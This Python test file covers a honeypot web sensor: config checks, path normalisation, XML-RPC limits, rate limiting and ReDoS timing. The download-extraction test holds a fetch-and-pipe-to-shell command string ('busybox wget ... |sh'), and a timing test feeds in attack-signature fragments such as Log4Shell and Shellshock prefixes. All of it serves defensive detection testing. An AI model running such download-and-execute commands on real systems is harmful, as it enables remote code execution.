"""Unit tests: parsing helpers, detection, limits, timing (ReDoS regression), configuration."""

from __future__ import annotations

import asyncio
import time
from datetime import UTC, datetime
from pathlib import Path

import pytest
from suckerpot_common import Event, EventType

from web_sensor import apache
from web_sensor.config import Config
from web_sensor.detect import Detector, extract_downloads
from web_sensor.events import EventSink
from web_sensor.httpio import HttpError, Request
from web_sensor.profile import build_profile, load_or_create_profile
from web_sensor.site import normalize_path
from web_sensor.xmlrpc import XmlRpcError, parse_call


def make_req(**kw: object) -> Request:
    req = Request(method="GET", target="/", path="/", version="HTTP/1.1")
    for k, v in kw.items():
        setattr(req, k, v)
    req.finalize_headers()
    return req


def test_config_validation() -> None:
    assert Config.from_env({}).php_version == "8.3.6"
    with pytest.raises(ValueError):
        Config.from_env({"WEB_PHP_VERSION": "8.3.36"})  # patched release: not the vulnerable range
    with pytest.raises(ValueError):
        Config.from_env({"WEB_HOSTNAME": "bad host"})
    with pytest.raises(ValueError):
        Config.from_env({"WEB_SERVER_TOKEN": "nginx"})
    assert Config.from_env({"WEB_HTTP_PUBLIC_PORT": "8081"}).http_public_port == 8081


def test_profile_is_stable_and_private(tmp_path: Path) -> None:
    a = load_or_create_profile(str(tmp_path))
    b = load_or_create_profile(str(tmp_path))
    assert a == b and a.server_ip.startswith("10.")
    f = tmp_path / "profile.json"
    assert oct(f.stat().st_mode & 0o777) == "0o600"
    other = load_or_create_profile(str(tmp_path / "other"))
    assert (
        other.server_ip != a.server_ip
        or other.site_title != a.site_title
        or other.secret != a.secret
    )
    assert 3 <= len(a.posts) <= 6 and a.users[0].login == "admin"


def test_normalize_path() -> None:
    assert normalize_path("/a/./b//c/") == "/a/b/c/"
    assert normalize_path("/a/../b") == "/b"
    assert normalize_path("//robots.txt") == "/robots.txt"
    for bad, status in [
        ("/../x", 400),
        ("/%zz", 400),
        ("/%2e%2e/x", 400),
        ("/a%2fb", 404),
        ("/%00", 404),
        ("/%4", 400),
    ]:
        with pytest.raises(HttpError) as exc:
            normalize_path(bad)
        assert exc.value.status == status, bad


def test_error_pages_are_exact() -> None:
    page = apache.error_page(404, server="Apache/2.4.58 (Ubuntu)", host="x", port=80)
    assert len(page) == 263
    assert b"honeypot" not in page.lower() and b"suckerpot" not in page.lower()


def test_etag_and_gzip() -> None:
    assert apache.etag(3, 1_770_000_000.0) == '"3-64c300a1bd000"'.replace(
        "64c300a1bd000", f"{1_770_000_000_000_000:x}"
    )
    data = b"hello world" * 100
    import gzip

    assert gzip.decompress(apache.gzip_bytes(data)) == data
    assert apache.accepts_gzip("deflate, gzip;q=0.8") and not apache.accepts_gzip("gzip;q=0")


def test_xmlrpc_limits() -> None:
    deep = (
        b"<methodCall><methodName>a</methodName><params>"
        + b"<param><value><array><data><value>" * 50
    )
    with pytest.raises(XmlRpcError):
        parse_call(deep)
    with pytest.raises(XmlRpcError):
        parse_call(b"<notacall/>")
    with pytest.raises(XmlRpcError):
        parse_call(b'<!DOCTYPE x [<!ENTITY a "b">]><methodCall/>')


def test_downloads_extraction_edge_cases() -> None:
    text = b"echo x;wget${IFS}http://198.51.100.1/a.sh;busybox wget -O- ftp://192.0.2.1/b|sh"
    urls = {d["url"] for d in extract_downloads(text, text.lower(), "")}
    assert urls == {"http://198.51.100.1/a.sh", "ftp://192.0.2.1/b"}
    assert extract_downloads(b"wget", b"wget", "") == []
    many = b" ".join(b"wget http://192.0.2.%d/x" % i for i in range(50))
    assert len(extract_downloads(many, many, "")) == 8


# -- timing regression (no ReDoS, linear behaviour) --------------------------------------------

PATHOLOGICAL = [
    b"a" * 65536,
    b"%" * 20000,
    b"%25" * 8000,
    b"wget " * 8000,
    b"${jndi:" * 5000,
    b"() { " * 10000,
    b"../" * 20000,
    b"<?php " * 10000,
    b'name="PHP_SESSION_UPLOAD_PROGRESS' * 2000,
    b"/tmp/sess_" * 6000,
    (b"A" * 4000 + b"=") * 16,
    b"\r\n" * 30000,
    b";|&'\"()<>{}`\\^, " * 4000,
]


@pytest.mark.parametrize("payload", range(len(PATHOLOGICAL)))
def test_detector_is_fast_on_pathological_input(payload: int) -> None:
    data = PATHOLOGICAL[payload]
    det = Detector(Config())
    req = make_req(
        path="/"
        + data[:4000].decode("latin-1").replace(" ", "x").replace("\r", "").replace("\n", ""),
        query=data[:8000].decode("latin-1").replace("\r", "").replace("\n", ""),
        body=data[:65536],
        headers=[
            ("User-Agent", data[:1024].decode("latin-1")),
            ("Content-Type", "multipart/form-data; boundary=x"),
            ("Cookie", "PHPSESSID=" + "a" * 500),
        ],
        content_length=len(data),
    )
    req.finalize_headers()
    start = time.perf_counter()
    for _ in range(5):
        det.analyze(req, "192.0.2.1")
    assert (time.perf_counter() - start) / 5 < 0.05


@pytest.mark.parametrize("size", [4096, 16384, 65536])
def test_normalize_and_xml_are_linear(size: int) -> None:
    start = time.perf_counter()
    for payload in ("/" + "a/" * (size // 2), "/" + "%41" * (size // 3), "/" + "./" * (size // 2)):
        try:
            normalize_path(payload)
        except HttpError:
            pass
    try:
        parse_call(
            b"<methodCall><methodName>x</methodName>" + b"<params>" * (size // 8) + b"</methodCall>"
        )
    except XmlRpcError:
        pass
    assert time.perf_counter() - start < 0.5


# -- event limits ------------------------------------------------------------------------------


class _Pub:
    def __init__(self) -> None:
        self.events: list[Event] = []

    async def publish(self, event: Event) -> bool:
        self.events.append(event)
        return True

    async def close(self) -> None:
        return None


async def test_event_buckets_and_guaranteed_quota() -> None:
    pub = _Pub()
    sink = EventSink(
        pub,
        rate=1,
        burst=3,
        important_rate=1,
        important_burst=50,
        global_rate=1000,
        global_burst=1000,
    )
    sink.start()

    def emit(t: EventType, important: bool = False) -> bool:
        return sink.emit(
            session_id="s1",
            src_ip="192.0.2.1",
            src_port=1,
            dst_port=80,
            type_=t,
            data={},
            important=important,
        )

    ok = [emit(EventType.http_request) for _ in range(10)]
    assert ok.count(True) == 3  # the burst
    # important events are not starved by the noisy ones
    assert all(emit(EventType.login_attempt, True) for _ in range(20))
    assert emit(EventType.disconnect)
    assert sink.end_session("s1") == 7
    await sink.flush()
    assert len(pub.events) == 3 + 20 + 1
    await sink.close()


async def test_global_cap_and_oversized_data() -> None:
    pub = _Pub()
    sink = EventSink(pub, rate=1000, burst=1000, global_rate=1, global_burst=5)
    sink.start()
    sent = sum(
        sink.emit(session_id=f"s{i}", src_ip="192.0.2.1", src_port=1, dst_port=80,
                  type_=EventType.http_request, data={"x": "y" * 100000})
        for i in range(50)
    )  # fmt: skip
    assert sent <= 6
    await sink.flush()
    assert all(len(e.model_dump_json()) < 20000 for e in pub.events)
    await sink.close()


def test_profile_dates_are_before_creation() -> None:
    p = build_profile(b"k" * 32, 1_790_000_000.0)
    assert all(post.ts <= p.created for post in p.posts)
    assert datetime.fromtimestamp(p.install_ts, UTC).year >= 2025


async def test_important_per_ip_and_reserved_global_share() -> None:
    pub = _Pub()
    sink = EventSink(
        pub,
        rate=1000,
        burst=1000,
        important_rate=1000,
        important_burst=1000,
        important_ip_rate=1,
        important_ip_burst=5,
        global_rate=1,
        global_burst=100,
    )
    sink.start()

    def emit(t: EventType, ip: str, sid: str, important: bool = False) -> bool:
        return sink.emit(
            session_id=sid,
            src_ip=ip,
            src_port=1,
            dst_port=80,
            type_=t,
            data={},
            important=important,
        )

    # one IP cannot exceed its important bucket, whatever the number of sessions
    sent = sum(emit(EventType.login_attempt, "192.0.2.1", f"s{i}", True) for i in range(50))
    assert sent == 5
    # ordinary events stop at the reserved share, important ones can still use it
    ordinary = sum(emit(EventType.http_request, "192.0.2.2", f"o{i}") for i in range(200))
    assert ordinary <= 75
    assert emit(EventType.login_attempt, "192.0.2.3", "imp", True)
    # disconnects dip below the reserve, so they are mostly kept, but never unbounded
    kept = sum(emit(EventType.disconnect, "192.0.2.4", f"d{i}") for i in range(100))
    assert 0 < kept < 100
    await sink.close()


async def test_rate_limited_scan_is_aggregated(tls_files: object) -> None:
    from conftest import _start

    async with _start(tls_files, {"conn_rate": 0.001, "conn_burst": 1.0}) as h:  # type: ignore[arg-type]
        for _ in range(6):
            r, w = await asyncio.open_connection("127.0.0.1", h.http)
            w.close()
        await asyncio.sleep(0.3)
        h.sensor.flush_limited()
        await h.sink.flush()
        scans = [e for e in h.publisher.events if e.type == "scan"]
        assert len(scans) == 1
        assert scans[0].data["kind"] == "rate_limited" and scans[0].data["refused"] >= 4


def test_default_hostname_is_a_reserved_fake_name() -> None:
    """The abuse-report redactor (reporting/terms.py FAKE_HOSTNAMES) knows this default."""
    from web_sensor.config import Config

    assert Config.from_env({}).hostname in {"srv-web01", "srv-app02", "srv-db01"}
